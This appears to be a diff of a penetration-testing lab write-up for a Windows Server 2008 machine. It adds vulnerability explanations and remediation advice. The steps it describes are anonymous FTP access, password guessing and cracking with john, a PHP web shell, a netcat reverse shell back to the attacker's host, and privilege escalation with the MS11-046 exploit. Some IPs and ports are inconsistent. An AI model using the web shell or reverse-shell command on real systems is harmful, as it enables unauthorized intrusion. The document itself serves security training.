@@ -12,27 +12,148 @@ IP: 192.168.100.46
 
 
 # Resolution summary
-- Logged into FTP server anonymously and retreived a username
-- Guessed password for found user to gain access to users ftp server
-- Located username and hashed password
-- Found the ftp directory was in the root directory of wordpress site
-- Utilized john to crack the users hashed password
-- Accessed found login page on port 242
-- Uploaded a simple php backdoor script in the FTP server within the root directory of wordpress site
+- Gained access to an anonymous FTP server login and obtained a username
+- Guessed the password for the discovered user in order to access the FTP server.
+- Found the hashed password and username
+- Discovered that the WordPress site's root directory contained the ftp directory.
+- John was used to crack the user's hashed password.
+- Accessed the login page on port 242
+- Uploaded a simple PHP backdoor script to the WordPress site's root directory on the FTP server.
 - Confirmed RCE
-- Uploaded netcat binary to FTP server 
-- Received a command prompt running as 
+- Uploaded a netcat binary to FTP server 
+- Received a command prompt 
 - Found system was not patched for vulnerability MS11-046 
-- Transferred compiled MS11-046 binary onto the system and received a CMD running as nt authority\system
-
+- After transferring the compiled MS11-046 binary onto the system and executing the exploit, a CMD executing as nt authority\system was obtained.
+- 
 ## Improved skills
 - Password guessing
-- Learned an .htaccess file is located within the root directory of wordpress sites. 
-- Learned (depending on the hosting provider) the root directory may be a folder labeled public_html, www, htdocs or httpdocs
+- Discovered that the root directory of WordPress sites has a.htaccess file.
+- Acquired knowledge (based on the hosting provider)  A folder with the name public_html, www, htdocs, or httpdocs may be the root directory.
 
 ## Used tools
 - rustscan
 - john
+
+### **Initial Access Vulnerability Explanation:** 
+# 1. Anonymous FTP Acccess
+# 2. Writable Root Directory to a Web Server
+
+# 1. Anonymous FTP Acccess
+Title: Anonymous FTP Misconfiguration Vulnerability
+Type of Vulnerability: Security Misconfiguration (OWASP Top 10: A6:2017-Security Misconfiguration)
+CWE Reference: CWE-276: Incorrect Default Permissions
+Proposal for CVSS Score: 5.3 (Medium)
+
+    CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    The medium score reflects the risk that unauthorized access to files can lead to information disclosure. The impact is somewhat mitigated by the fact that compromise of integrity and availability is not directly facilitated by this vulnerability.
+
+Generic Description:
+
+The Anonymous FTP vulnerability arises from a misconfiguration of FTP servers that allows anonymous users to access files and directories. FTP (File Transfer Protocol) servers are used for transferring files between clients and servers on a network. When configured to allow anonymous access, users can log in with a standard username such as "anonymous" or "ftp" and, in many cases, any password or no password. While anonymous FTP can be intentionally used to provide public access to files, it becomes a vulnerability when sensitive data is inadvertently made accessible due to a misconfiguration or oversight.
+Specific Description:
+
+This vulnerability stems from either an intentional or unintentional configuration that permits users to access an FTP server anonymously, i.e., without providing a personal username and password. This can lead to unauthorized access to sensitive files or directories, information disclosure, and potentially a foothold in the network for further attacks if sensitive data or executables are accessed. The issue is exacerbated if the anonymous user is granted write access, as this can lead to the upload of malicious files, defacement, or distribution of illegal content.
+
+# 2. Writable Root Directory to a Web Server
+Title: Insecure Permissions on Web Server Root Directory
+Type of Vulnerability: Security Misconfiguration (OWASP Top 10: A6:2017-Security Misconfiguration)
+CWE Reference: CWE-276: Incorrect Default Permissions
+Proposal for CVSS Score: 7.5 (High)
+
+    CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
+    The score reflects the vulnerability's network accessibility, low attack complexity, no required privileges, and no user interaction. The impact is rated high for integrity and availability because writable root directories can lead to website defacement, deployment of malicious content, and potentially to more severe server-side attacks.
+
+Generic Description:
+
+A writable root directory in a web server constitutes a significant security vulnerability. This configuration flaw occurs when the root directory of the web server, which is accessible over the web, is configured with permissions that allow unauthorized users to write or modify files. This can lead to several security risks, including website defacement, the uploading of malicious web shells, data theft, and the distribution of malware to visitors of the website. The issue often arises due to misconfigurations or oversight during the setup of the web server.
+Specific Description:
+
+The vulnerability is primarily due to inadequate file permissions set on the web server’s root directory. Web servers are typically configured to serve files from a specific directory known as the root directory. When this directory is writable by users other than those administrating the server, it becomes possible for attackers to upload, modify, or delete files. This can be exploited by uploading malicious scripts or content, thereby compromising the server or its hosted applications. The exploitation of this vulnerability does not require authenticated access, making it a critical risk that needs immediate attention.
+
+### **Initial Access Vulnerability Fix:** 
+
+# 1. Anonymous FTP Access
+
+1. **Review FTP Server Configuration:** Regularly review the configuration of your FTP server to ensure that anonymous access is disabled unless it is a deliberate choice for sharing non-sensitive data. Ensure that directories accessible via anonymous FTP do not contain sensitive information.
+    
+2. **Limit Anonymous Access:** If anonymous access must be enabled for legitimate reasons, strictly limit the directories and files that can be accessed. Never allow write access to anonymous users. Consider using directory permissions or chroot jails to restrict access.
+    
+3. **Use Secure Alternatives:** Where possible, use more secure alternatives to FTP, such as SFTP (SSH File Transfer Protocol) or FTPS (FTP Secure), which provide encrypted connections and better authentication mechanisms.
+    
+4. **Monitor Access Logs:** Regularly monitor FTP access logs for unusual or unauthorized access patterns. This can help in identifying and responding to attempts to exploit the anonymous FTP configuration.
+    
+5. **Educate and Train Staff:** Ensure that staff responsible for managing FTP servers are aware of the risks associated with anonymous FTP and are trained in secure configuration practices.
+    
+6. **Implement Network Segmentation:** Segregate FTP servers from the rest of the network as much as possible to limit the potential impact of a breach. Use firewalls and other network security tools to control access to the FTP server.
+    
+7. **Regular Security Audits and Penetration Testing:** Conduct regular security audits of your network, including penetration testing, to identify and rectify potential vulnerabilities like anonymous FTP misconfigurations.
+    
+
+By implementing these remediation steps, organizations can significantly mitigate the risks associated with anonymous FTP configurations and enhance their security posture against unauthorized access and information disclosure.
+
+# 2. Writable Root Directory to a Web Server
+1. **Review and Restrict Directory Permissions:** Examine the permissions set on the web server’s root directory and ensure that they are restricted to read-only for unauthorized users. Only administrative accounts or specific service accounts required for the operation of legitimate web applications should have write permissions.
+    
+2. **Implement Proper Access Controls:** Use access control mechanisms to define who can modify the content within the web server’s directories. This should be tightly controlled and monitored.
+    
+3. **Use a Web Application Firewall (WAF):** Deploy a Web Application Firewall to detect and block attempts to exploit web vulnerabilities, including unauthorized attempts to upload or modify files.
+    
+4. **Regular Security Audits:** Conduct regular security audits of your web server configurations and permissions to ensure that no insecure permissions are granted due to oversight or configuration changes.
+    
+5. **Separation of Environments:** Separate development, testing, and production environments and ensure that only necessary files are present in the production environment. This minimizes the risk of accidental exposure of writable directories.
+    
+6. **Disable Unnecessary Services:** Disable any services or features of the web server that are not required for its operation. This reduces the potential attack surface.
+    
+7. **File Upload Security:** If your application requires users to upload files, ensure that uploads are handled securely. This includes validating file types, scanning for malware, and storing files in a location outside the web root when possible.
+    
+8. **Regular Backups and Monitoring:** Maintain regular backups of the web server and hosted content. Implement monitoring to detect unauthorized changes to the website’s files and directories.
+    
+9. **Educate Developers and Administrators:** Ensure that developers and administrators are aware of the risks associated with writable web directories and train them in secure configuration practices.
+    
+
+By addressing this vulnerability with a comprehensive remediation plan, organizations can significantly enhance the security of their web servers and protect against a range of web-based attacks.
+
+### **Privilege Escalation Vulnerability Explanation:** 
+
+#### Title: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege
+
+#### Type of Vulnerability: Elevation of Privilege (EoP)
+
+#### CWE Reference: CWE-269: Improper Privilege Management
+
+#### Proposal for CVSS Score: 7.2 (High)
+
+- **CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H**
+- This score is based on the vulnerability being locally exploitable, requiring prior access to the target system (low attack complexity and privilege level), and no user interaction. It leads to a high impact on confidentiality, integrity, and availability due to elevation of privilege.
+
+#### Generic Description:
+
+The MS11-046 vulnerability pertains to a flaw in the Windows Ancillary Function Driver (AFD), which is a part of the Windows operating system kernel that provides support for Windows Sockets applications to perform various network operations. This vulnerability allows an authenticated local user to elevate their privileges on a Windows system. Successful exploitation of this vulnerability could allow an attacker to execute code with elevated privileges, enabling full control over the affected system. This issue is due to improper management of objects in memory by the AFD, which could be exploited via a specially crafted application.
+
+#### Specific Description:
+
+This elevation of privilege vulnerability is caused by the Ancillary Function Driver (AFD) improperly validating input passed from user mode to the kernel. Attackers who successfully exploit this vulnerability could run arbitrary code in kernel mode. Running code in kernel mode could then allow the attacker to install programs; view, change, or delete data; or create new accounts with full user rights. Attackers would need to have valid login credentials and be able to log on locally to exploit this vulnerability, making it an elevation of privilege vulnerability, as it cannot be exploited remotely or by anonymous users.
+
+### **Privilege Escalation Vulnerability Fix:** 
+
+1. **Apply Microsoft Patch:** Microsoft has addressed this vulnerability in their MS11-046 security bulletin. The primary remediation is to apply the update provided by Microsoft for affected systems. This patch fixes the vulnerability by correcting the way that the Ancillary Function Driver (AFD) validates input passed from user mode.
+    
+2. **Principle of Least Privilege:** Ensure that all user accounts operate under the principle of least privilege, meaning they have only the permissions necessary for their roles. This can mitigate the impact of this vulnerability by limiting what an attacker can do if they manage to exploit this flaw.
+    
+3. **Security Awareness Training:** Users should be trained to avoid practices that could lead to malware infection or unauthorized access, as the exploitation of this vulnerability requires local access. Awareness about phishing, malicious software, and social engineering is key.
+    
+4. **Regular System and Software Updates:** Regularly update all systems and software, not just the operating system, to protect against vulnerabilities. Use automated update mechanisms where available.
+    
+5. **Access Control Measures:** Implement strong access control measures, including the use of strong passwords, multi-factor authentication (MFA), and account lockout policies to prevent unauthorized access to systems.
+    
+6. **Monitoring and Logging:** Enhance system monitoring to detect unusual behavior that might indicate an exploitation attempt. Ensure that logs are maintained and regularly reviewed for signs of unauthorized or anomalous activities.
+    
+7. **Incident Response Plan:** Have an incident response plan in place that includes procedures for responding to a system compromise, including elevation of privilege exploits. This should involve initial containment, eradication of the threat, recovery steps, and a post-mortem analysis to prevent future occurrences.
+    
+
+By following these remediation steps, organizations can protect themselves against the MS11-046 vulnerability and improve their overall security posture against similar elevation of privilege threats.
+
+
 
 ---
 
@@ -137,33 +258,37 @@ Enumerated top 200 UDP ports:
 # Enumeration
 ## Port 21
 
-#### -Logged in to FTP as anonymous and found user admin listed in "accounts":
+- Next, we focus on gaining access to the FTP server. We are able to log in anonymously and retrieve username admin.
 
 ![](Images/Pasted%20image%2020221001114759.png)
 
-#### -Attempted to login via FTP as username "admin" and password "admin" and found the following files and then downloaded them to my kali machine:
+- Next, we guess the user admin password and use the following credentials to access the user's FTP server:
+  
+username: admin
+password: admin
 
 ![](Images/Pasted%20image%2020221001114845.png)
 
-#### -Cat'd ".htpasswd" file and found the following "offsec" user and the hashed password:
+- We locate the hashed password for offsec and the username offsec in file .htpasswd after downloading the discovered files to our Kali machine.
 
 ![](Images/Pasted%20image%2020221001114935.png)
 
-#### - Cat'd ".htaccess" and found:
+- The FTP directory is located in the WordPress site's root directory, as indicated by the.htaccess file.
 
 ![](Images/Pasted%20image%2020221001115013.png)
 
-#### -Googled "what is a .htaccess file" and found it is located in a root directory:
-
 ![](Images/Pasted%20image%2020221001115038.png)
 
-#### -Typed "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt" to crack the hash and password "elite" was received:
+- The password "elite" was obtained when we used "john hash.txt - wordlist=/usr/share/wordlists/rockyou.txt" to crack the hash:
 
 ![](Images/Pasted%20image%2020221001115111.png)
 
 ## Port 242
 
-#### -Navigated to "http://192.168.100.46:242" and required a login. Input the found user "offsec" and password "elite" andwas able to login showing the following webpage:
+- Next, we use the obtained credentials below to access the login page on "http://192.168.100.46:242":
+
+username: offsec
+password: elite
 
 ![](Images/Pasted%20image%2020221001115137.png)
 
@@ -177,38 +302,31 @@ Enumerated top 200 UDP ports:
 
 ## Port 21
 
-#### -Per my previous findings of the .htaccess file being located in a root directory. I created a file named "simplephpbackdoor.php" with the folowing contents on my kali machine:
+- As per our earlier discoveries, the root directory contains the.htaccess file.
 
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+- On our Kali machine, we create a file called "simplephpbackdoor.php" that contains the following:
 
-#### Logged into ftp with credentials user "admin" password "admin"
+<?php system($_GET["cmd"]);?>
 
-#### -Uploaded "simplephpbackdoor.php" 
+- Subsequently, we access the admin FTP server and upload the file simplephpbackdoor.php.
 
 ![](Images/Pasted%20image%2020221001115235.png)
 
 ## Port 242
 
-#### -Navigated to "http://192.168.69.46:242/simplephpbackdoor.php" and a blank page came up
-
-#### -Navigated to "http://192.168.69.46:242/simplephpbackdoor.php?cmd=dir" and found we had remote code execution:
+- After that, we confirm remote code execution (RCE) by visiting the URL below:
 
 ![](Images/Pasted%20image%2020221001115307.png)
 
 #simplephpbackdoorRCE
 
-#### -Typed "locate nc.exe" on kali machine and typed "cp /usr/share/windows-resources/binaries/nc.exe ." to copy the nc.exe binary into kali machine home directory:
+- We transfer a netcat binary to the FTP server.
 
-![](Images/Pasted%20image%2020221001115341.png)
+- We launch a netcat listener on our Kali machine at port 3145.
 
-#### -Typed "ftp 192.168.69.46" and logged in with user admin and password admin
+- The reverse shell is then executed by visiting the following URL, which gives us a shell.
 
-#### -Typed "put nc.exe" to place nc.exe binary in root directory of target machine
-#nc.exeBinaryDownload
-
-#### -Started netcat listener on kali machine listening on port 3145
-
-#### -Navigated to "http://192.168.69.46:242/simplephpbackdoor.php?cmd=nc.exe [kali machine IP] 3145 -e cmd" and received a command prompt:
+[http://192.168.69.46:242/simplephpbackdoor.php?cmd=](http://192.168.69.46:242/simplephpbackdoor.php?cmd=dir)nc 192.18.69.127 9090 -e cmd
 
 ![](Images/Pasted%20image%2020221001115406.png)
 
@@ -218,8 +336,9 @@ Enumerated top 200 UDP ports:
 # Privilege Escalation
 ## Local Enumeration
 
-#### -Typed "systeminfo" and found the found the machine was running Windows Server 2008 with no hot fixes/patches installed:
+- Entering “systeminfo” revealed that Windows Server 2008 was being used on the computer, and no hot fixes or updates were present:
 
+```
 Host Name:                 LIVDA
 OS Name:                   Microsoftr Windows Serverr 2008 Standard 
 OS Version:                6.0.6001 Service Pack 1 Build 6001
@@ -253,31 +372,27 @@ Domain:                    WORKGROUP
 Logon Server:              N/A
 Hotfix(s):                 N/A
 Network Card(s):           N/A
-
+```
 #KernalExploitPrivilegeEscalation
 
-
-#### -Googled "6.0.6001 Service Pack 1 Build 6001 exploit"  and found the following webpage with exploit MS11-046:
+- Searching for "6.0.6001 Service Pack 1 Build 6001 exploit" on Google brought to the webpage that included exploit MS11-046:
 
 ![](Images/Pasted%20image%2020221001115431.png)
 
 ![](Images/Pasted%20image%2020221001115452.png)
 
-#### -As the exploit show above was not already precompiled I navigated to "https://github.com/SecWiki/windows-kernel-exploits" as the webpage had a precompiled MS11-046 exploit:
+- We search for the exploit on Google and download the precompiled version listed below to our Kali machine.
 
 ![](Images/Pasted%20image%2020221001115515.png)
 
 ![](Images/Pasted%20image%2020221001115534.png)
 
-#### -Downloaded the complied MS11-046 exploit to my kali machine
-
-
 ## Privilege Escalation vector
 ## MS11-046
 
-#### -Transferred MS11-046 exploit to the target machine
+- We then transferred the compiled MS11–046 binary onto the target system
 
-#### -Typed "ms11-046.exe" and received a command prompt running as nt authority\system:
+- A command prompt executing as nt authority\system appeared when we typed “ms11–046.exe”:
 
 ![](Images/Pasted%20image%2020221001115612.png)
 ![](../Images/Pasted%20image%2020220622221842.png)
